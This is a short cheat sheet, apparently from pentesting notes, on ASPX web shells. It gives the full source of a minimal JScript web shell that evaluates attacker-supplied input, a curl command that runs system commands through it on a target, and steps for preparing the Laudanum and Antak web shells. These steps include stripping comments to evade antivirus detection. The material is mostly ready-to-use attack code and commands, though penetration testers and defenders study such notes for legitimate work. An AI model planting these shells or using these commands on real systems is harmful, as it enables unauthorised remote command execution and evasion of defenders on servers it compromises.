# Aspx Webshell

### Minimal .aspx webshell

**Save as spam.aspx**

```aspx
<script language="JScript" runat="server">
function Page_Load(){
eval(Request["shell"],"unsafe");
}
</script>
```

**Upload to Target**

**Interact**

```bash
curl -s -k https://$host/spam.aspx \
  -d 'shell=Response.Write(
    new ActiveXObject("WScript.Shell")
      .Exec("cmd /c whoami")
      .StdOut
      .ReadAll()
);' | head -n 1
```

### **Laudanum ASPX webshell**

```
/usr/share/laudanum/aspx/shell.aspx
```

* Copy the shell to a working directory before modifying:

```bash
cp /usr/share/laudanum/aspx/shell.aspx /home/tester/demo.aspx
```

* Edit `line 59` — add your IP to the `allowedIps` variable
* Remove ASCII art and comments as they are often signatured by AV/defenders
* Upload the modified file to the target web server
* Navigate to the uploaded file in the browser (e.g. `http://target/files/demo.aspx`)
* The shell provides a `cmd /c` prompt to execute commands via the browser

### **Antak**

Antak is an ASP.NET web shell from the [Nishang](https://github.com/samratashok/nishang) project. It provides a PowerShell-themed UI, executes each command as a new process, can encode and execute scripts in memory, upload/download files, and parse `web.config`.

```
/usr/share/nishang/Antak-WebShell/antak.aspx
```

* Copy before modifying:

```bash
cp /usr/share/nishang/Antak-WebShell/antak.aspx /home/tester/Upload.aspx
```

* Edit `line 14` — set a username and password for shell access
* Remove ASCII art and comments to avoid AV signatures
* Upload the modified file to the target web server
* Navigate to the uploaded file in the browser
* Log in with the credentials you set
* Execute PowerShell commands from the shell interface
